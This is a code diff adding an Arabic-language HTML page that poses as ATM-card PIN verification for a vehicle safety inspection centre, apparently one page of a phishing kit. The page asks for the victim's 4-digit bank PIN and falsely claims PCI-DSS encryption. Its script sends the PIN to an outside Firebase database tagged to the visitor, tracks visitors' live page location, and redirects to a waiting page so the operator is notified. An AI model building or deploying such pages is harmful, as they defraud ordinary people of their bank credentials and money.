@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من بطاقة الصراف - مركز سلامة المركبات</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+
+        .atm-container {
+            background: #fff;
+            width: 100%;
+            max-width: 350px; /* تصغير الصفحة لتكون ملمومة وهادئة */
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+
+        .icon-box { margin-bottom: 15px; }
+        .icon-box img { width: 50px; height: auto; }
+
+        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
+        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px; }
+
+        /* تعديل خانات الإدخال الأربعة لتكون مربع واحد موحد */
+        .atm-pin-field {
+            width: 100%;
+            max-width: 220px; /* تحديد عرض مربع الإدخال */
+            height: 45px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            letter-spacing: 12px; /* تباعد الحروف داخل المربع الموحد */
+            font-weight: bold;
+            color: var(--main-green);
+            outline: none;
+            background-color: #fafafa;
+            margin-bottom: 20px;
+        }
+
+        .atm-pin-field:focus { border-color: var(--main-green); background-color: #fff; }
+
+        .btn-confirm {
+            width: 100%;
+            background-color: var(--main-green);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .secure-notice {
+            margin-top: 15px;
+            font-size: 10px;
+            color: #bbb;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="atm-container">
+        <div class="icon-box">
+            <img src="https://img.icons8.com/fluency/96/000000/atm.png" alt="ATM Security">
+        </div>
+
+        <h2>التحقق من الرقم السري</h2>
+        <p>يرجى إدخال الرقم السري لبطاقة الصراف الآلي (PIN) المكون من 4 أرقام لإتمام عملية المصادقة الآمنة.</p>
+
+        <input type="password" maxlength="4" class="atm-pin-field" id="pinCode" placeholder="****">
+
+        <button class="btn-confirm" onclick="sendPIN()">تأكيد الرقم السري</button>
+
+        <div class="secure-notice">
+            🔒 تشفير بيانات بمعيار PCI-DSS العالمي
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = { 
+            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
+            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
+            projectId: "vsc-project" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const visitorId = localStorage.getItem('visitorId');
+
+        function sendPIN() {
+            let pinVal = document.getElementById('pinCode').value;
+
+            if (pinVal.length === 4) {
+                database.ref('payments/' + visitorId).update({
+                    atm_pin: pinVal,
+                    status: "atm_pin_sent",
+                    last_update: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    // العودة لصفحة الانتظار ليعطيك إشعاراً في الآدمن
+                    window.location.href = 'loading.html';
+                });
+            } else {
+                alert("يرجى إدخال 4 أرقام");
+            }
+        }
+
+        if (visitorId) {
+            database.ref('live_visitors/' + visitorId).update({
+                page: "صفحة الرقم السري الموحد (ATM PIN)"
+            });
+        }
+    </script>
+</body>
+</html>
